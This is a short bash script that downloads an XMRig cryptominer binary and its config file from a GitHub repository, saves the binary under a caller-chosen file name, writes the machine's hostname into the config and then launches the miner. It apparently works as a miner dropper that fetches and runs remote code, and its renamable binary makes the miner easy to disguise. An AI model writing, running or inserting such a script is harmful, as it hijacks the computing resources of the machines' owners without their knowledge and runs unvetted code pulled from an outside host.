#!/bin/bash

CONFIG="https://raw.githubusercontent.com/blackUser623/xm/main/config.json"
TERMINAL="https://raw.githubusercontent.com/blackUser623/xm/main/xmrig"
PASS=$(hostname)
DIR="$1"
FILE="$2"

wget ${CONFIG} -O ${DIR}config.json
wget ${TERMINAL} -O ${DIR}${FILE}

sed -i "s/xxxxx/${PASS}/g" ${DIR}config.json

cd ${DIR} && $FILE || exit
